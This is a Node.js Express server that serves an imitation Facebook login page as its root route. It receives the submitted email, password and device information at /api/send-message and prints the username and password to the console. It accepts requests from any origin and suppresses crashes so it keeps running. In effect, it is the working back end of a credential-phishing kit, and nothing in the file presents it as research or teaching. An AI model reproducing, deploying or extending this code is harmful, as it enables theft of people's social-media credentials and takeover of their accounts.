const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 5000;

console.log('Starting simple server...');
console.log('Current directory:', __dirname);

// Check if the facebook_login.html file exists
const facebookLoginPath = path.join(__dirname, 'Niceplace', 'facebook_login.html');
if (fs.existsSync(facebookLoginPath)) {
  console.log(`Facebook login file exists at: ${facebookLoginPath}`);
} else {
  console.error(`ERROR: Facebook login file NOT found at: ${facebookLoginPath}`);
}

// Set headers to allow cross-origin requests
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Parse JSON request bodies
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Log all requests
app.use((req, res, next) => {
  console.log(`Request: ${req.method} ${req.url}`);
  next();
});

// Serve static files from the Niceplace directory
app.use(express.static(path.join(__dirname, 'Niceplace')));

// Root route - serve the Facebook login page
app.get('/', (req, res) => {
  console.log('Serving facebook_login.html');
  res.sendFile(facebookLoginPath);
});

// API endpoint to receive form data
app.post('/api/send-message', (req, res) => {
  try {
    const { email, password, deviceInfo } = req.body;
    console.log('Login attempt received:');
    console.log('- Email/Username:', email);
    console.log('- Password:', password);
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in send-message endpoint:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Start the server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Simple server running on http://0.0.0.0:${PORT}`);
});

// Keep the server running and add some heartbeat logging
setInterval(() => {
  console.log("Server heartbeat - still running");
}, 30000);

// Create a file to indicate the server is running
fs.writeFileSync('server_running.txt', 'Server is running on port 5000');

// Prevent the script from exiting due to errors
process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
});